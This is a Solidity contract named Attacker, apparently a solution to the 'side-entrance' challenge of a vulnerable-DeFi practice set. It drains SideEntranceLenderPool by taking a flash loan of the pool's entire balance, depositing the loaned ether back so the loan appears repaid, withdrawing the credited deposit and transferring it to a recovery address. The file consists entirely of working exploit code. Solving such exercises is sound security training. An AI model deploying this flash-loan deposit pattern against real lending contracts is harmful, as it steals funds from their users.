pragma solidity =0.8.25;

import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";

contract Attacker {
    SideEntranceLenderPool private pool;
    address recoveryAddress;

    constructor(address _pool, address _recoveryAddress) {
        pool = SideEntranceLenderPool(_pool);
        recoveryAddress = _recoveryAddress;
    }

    fallback() payable external {}

    receive() payable external {}

    function attack() external returns (bool) {

        uint256 amountToSteal = address(pool).balance;

        pool.flashLoan(amountToSteal);

        pool.withdraw();

        payable(recoveryAddress).transfer(address(this).balance);

        return true;

    }

    function execute() external payable {

        pool.deposit{value: msg.value}();

    }
}